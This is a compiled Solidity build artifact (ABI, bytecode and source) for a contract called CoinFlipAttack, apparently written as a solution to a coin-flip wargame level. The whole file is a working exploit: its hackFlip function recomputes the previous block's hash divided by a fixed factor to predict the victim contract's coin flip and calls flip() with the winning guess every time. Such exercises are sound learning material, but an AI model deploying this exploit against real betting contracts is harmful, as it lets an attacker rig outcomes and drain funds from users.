{
  "contractName": "CoinFlipAttack",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_victim",
          "type": "address"
        }
      ],
      "name": "setVictim",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "hackFlip",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040527f800000000000000000000000000000000000000000000000000000000000000060005534801561003457600080fd5b506104f3806100446000396000f3fe608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630b4396211461005c5780635d5d4559146100ad578063930c2003146100c4575b600080fd5b34801561006857600080fd5b506100ab6004803603602081101561007f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061011b565b005b3480156100b957600080fd5b506100c261015f565b005b3480156100d057600080fd5b506100d9610281565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60006101756001436102a790919063ffffffff16565b406001900490506000610193600054836102f190919063ffffffff16565b90506000600182146101a65760006101a9565b60015b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082151515158152602001915050602060405180830381600087803b15801561024057600080fd5b505af1158015610254573d6000803e3d6000fd5b505050506040513d602081101561026a57600080fd5b810190808051906020019092919050505050505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006102e983836040805190810160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525061033b565b905092915050565b600061033383836040805190810160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506103fd565b905092915050565b600083831115829015156103ea576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b838110156103af578082015181840152602081019050610394565b50505050905090810190601f1680156103dc5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b6000808311829015156104ab576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610470578082015181840152602081019050610455565b50505050905090810190601f16801561049d5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b50600083858115156104b957fe5b04905080915050939250505056fea165627a7a72305820f90ad7fefaaa91b5f176101d8076be6be69c37b0f31dd0e871f03301150a8e540029",
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.5.0;\r\n\r\n/*\r\nImport the vulnerable contract so we can later\r\ninstantiate it and call its functions\r\n*/\r\n\r\n// import \"./CoinFlip.sol\";\r\ninterface CoinFlip_I {\r\n    function flip(bool _guess) external returns (bool);\r\n}\r\n\r\nimport \"./SafeMath.sol\";\r\n\r\ncontract CoinFlipAttack {\r\n    using SafeMath for uint256;\r\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n    address public victim;\r\n\r\n    function setVictim(address _victim) public {\r\n        victim = _victim;\r\n    }\r\n\r\n    function hackFlip() public {\r\n        uint256 blockValue = uint256(blockhash(block.number.sub(1)));\r\n        uint256 coinFlip = blockValue.div(FACTOR);\r\n        bool side = coinFlip == 1 ? true : false;\r\n\r\n        CoinFlip_I(victim).flip(side);\r\n    }\r\n}\r\n",
  "sourcePath": "C:/dev/dapps/playground/contracts/CoinFlipAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
  },
  "schemaVersion": "3.2.3",
  "updatedAt": "2020-08-18T02:44:16.653Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}